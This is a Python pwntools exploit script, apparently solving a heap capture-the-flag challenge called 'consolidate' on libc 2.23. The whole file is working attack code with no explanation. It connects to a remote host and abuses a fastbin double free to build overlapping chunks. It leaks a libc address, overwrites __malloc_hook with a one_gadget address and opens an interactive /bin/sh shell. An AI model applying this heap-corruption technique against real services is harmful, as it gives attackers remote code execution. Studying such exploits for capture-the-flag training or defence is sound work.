from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("47.106.8.27",47642)
# io=process("./consolidate")
libc=ELF("libc-2.23.so")
# elf=ELF("./consolidate")
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]


def add(cc):
    io.sendlineafter(b"choice\n",b"1")
    io.sendafter(b"content\n",cc)

def delete(n):
    io.sendlineafter(b"choice\n",b"2")
    io.sendlineafter(b"idx\n",str(n))
    
def edit(n,cc):
    io.sendlineafter(b"choice\n",b"3")
    io.sendlineafter(b"idx\n",str(n))
    io.sendafter(b"content\n",cc)

def show(n):
    io.sendlineafter(b"choice\n",b"4")
    io.sendlineafter(b"idx\n",str(n))

# gdb.attach(io)
# pause()

add(b"a") #0
add(b"b") #1
add(b"c") #2
add(b"d") #3
add(b"e") #4

# edit(0,cyclic(0x60))

delete(0)
delete(1)
delete(0)
edit(0,b"\xa0")
add(b"a")
# delete(1)
edit(1,p64(0)*5+p64(0x71))
# delete(1)

add(cyclic(0x38)+p64(0xe1))
delete(2)
show(2)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x68-libc.sym[b"__malloc_hook"]
print("leak_addr: "+hex(leak_addr))
realloc=leak_addr+libc.sym[b"__libc_realloc"]
malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
free_hook=leak_addr+libc.sym[b"__free_hook"]
shell=leak_addr+one_gadget[1]

delete(0)
# delete(1)
# delete(0)

edit(0,p64(malloc_hook-0x23))
# add(b"a")
add(b"a")
add(cyclic(0xb)+p64(shell)+p64(realloc+0x10))



io.sendlineafter(b"choice\n",b"1")
# io.sendafter(b"content\n",b"1")
# add(b"aaa")
# edit(1,)
# edit(1,cyclic(0x38)+p64(0xb1))
# delete(1)
# delete(0)
# add(cyclic(28))
# add(p64(0)*8)
# add(b"qqqqqq")


io.interactive()

# 0x45206 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4525a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xef9f4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf0897 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
